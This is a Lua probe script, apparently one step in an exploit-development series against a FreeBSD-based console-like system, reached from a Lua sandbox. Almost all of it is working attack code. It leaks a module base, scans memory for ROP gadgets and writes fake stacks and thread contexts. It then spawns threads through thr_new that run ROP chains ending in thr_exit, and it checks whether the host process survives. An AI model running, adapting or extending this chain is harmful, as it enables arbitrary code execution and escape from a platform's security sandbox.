-- CRASH_CLASS: HIGH
-- PROBE 418a: six children that end on thr_exit, and whether the loader survives
--
-- 417a showed one chain can end on 431 instead of parking, but one child proves nothing:
-- a single parked child is harmless too (399a). The discriminator is the number that
-- starves the loader. Five parked children left it accepting TCP and never executing
-- (405a); six children that really exited must leave it healthy.
--
-- Each child writes 16 bytes to its own socketpair and then runs 431 thr_exit. Six
-- children must leave 96 bytes total and a loader that still answers a syscall.

print("=== PROBE 418a: EXIT MANY CHILDREN ===")

local KIDS = 6
local BYTES = 16

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end
local function sgn(v)
    local h, l = 0, to_num(v)
    if type(v) == "table" then h = v.h or 0; l = v.l and to_num(v.l) or 0 end
    local x = h * 4294967296 + l
    if x >= 9223372036854775808 then x = x - 18446744073709551616 end
    return x
end
local function u64(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end
local function u64v(v) return u64(math.floor(v / 4294967296), v % 4294967296) end

-- gadgets
local info = memory.alloc(0x200)
memory.write_dword(info, 0x160)
call(593, 0, sgn(info), 0, 0, 0, 0)
local base = to_num(memory.read_dword(info + 0x10C)) * 4294967296 + to_num(memory.read_dword(info + 0x108))
local size = to_num(memory.read_dword(info + 0x110))
if size > 0x600000 then size = 0x600000 end
local buf
do
    local ok, b = pcall(function() return memory.read_buffer(base, size) end)
    if not ok or type(b) ~= "string" then print("=== 418a DONE ===") return end
    buf = b
end
local park, pop_rax = 0, 0
do
    local i = 1
    while i < #buf - 1 do
        local x, y = buf:byte(i, i + 1)
        if x == 0xEB and y == 0xFE and park == 0 then park = base + i - 1 end
        if x == 0x58 and y == 0xC3 and pop_rax == 0 then pop_rax = base + i - 1 end
        if park ~= 0 and pop_rax ~= 0 then break end
        i = i + 1
    end
end
local gadget = 0
pcall(function() gadget = to_num(syscall.syscall_address) end)
print(string.format("[A] base=0x%X park=0x%X pop=0x%X gadget=0x%X", base, park, pop_rax, gadget))
if park <= 0 or pop_rax <= 0 or gadget <= 0 then print("=== 418a DONE ===") return end

local argbuf = memory.alloc(0x40)
do
    local s = "ABCDEFGHIJKLMNOP"
    local i = 1
    while i <= #s do memory.write_byte(argbuf + i - 1, s:byte(i)); i = i + 1 end
end

local total = 0
local kid = 0
while kid < KIDS do
    local sv = memory.alloc(0x10)
    memory.write_qword(sv, u64(0, 0))
    local rv = call(135, 1, 1, 0, sgn(sv), 0, 0)
    local fd_a = to_num(memory.read_dword(sv))
    local fd_b = to_num(memory.read_dword(sv + 4))
    if rv ~= 0 or fd_a <= 0 or fd_b <= 0 then
        print(string.format("[B] socketpair %d failed", kid))
        break
    end

    local stack = call(477, 0, 0x200000, 3, 0x1002, 0xFFFFFFFF, 0)
    if stack <= 0 then print("[B] stack mmap failed"); break end
    local rsp = stack + 0x100000
    local p = rsp
    local function wq(v) memory.write_qword(p, u64v(v)); p = p + 8 end
    -- 2 writes, then thr_exit
    wq(4)
    wq(gadget)
    wq(pop_rax)
    wq(4)
    wq(gadget)
    wq(pop_rax)
    wq(431)
    wq(gadget)
    wq(park)

    local ctx = memory.alloc(0x500)
    local k = 0
    while k < 0x500 do memory.write_dword(ctx + k, 0); k = k + 4 end
    memory.write_qword(ctx + 0x108, u64(0, 0x480))
    memory.write_qword(ctx + 0x110, u64(0, 0x10000))
    memory.write_qword(ctx + 0x0c0, u64(0, 0x43))
    memory.write_qword(ctx + 0x0e0, u64v(pop_rax))
    memory.write_qword(ctx + 0x0f0, u64(0, 0x202))
    memory.write_qword(ctx + 0x0f8, u64v(rsp))
    memory.write_qword(ctx + 0x100, u64(0, 0x3b))
    memory.write_qword(ctx + 0x048, u64v(fd_a))
    memory.write_qword(ctx + 0x050, u64v(sgn(argbuf)))
    memory.write_qword(ctx + 0x058, u64(0, BYTES))

    local out = memory.alloc(0x20)
    memory.write_qword(out, u64(0, 0))
    local trv = call(430, sgn(ctx), sgn(out), 0)
    local tl = 0
    do
        local tq = memory.read_qword(out)
        if type(tq) == "table" then tl = to_num(tq.l) else tl = to_num(tq) end
    end
    print(string.format("[B] kid %d rv=%d tid=0x%X", kid, trv, tl))

    local t = 0
    while t < 2000000 do t = t + 1 end
    local rbuf = memory.alloc(0x400)
    local got = 0
    local rounds = 0
    while rounds < 4 do
        local n = call(29, fd_b, sgn(rbuf), 0x400, 0x80, 0, 0)
        if n <= 0 then break end
        got = got + n
        rounds = rounds + 1
    end
    total = total + got
    kid = kid + 1
end
print(string.format("[C] bytes from %d children = %d", KIDS, total))

local live = call(432, memory.alloc(0x20), 0)
print(string.format("[D] loader-side syscall after %d children: rv=%d", KIDS, live))
print("=== 418a DONE ===")
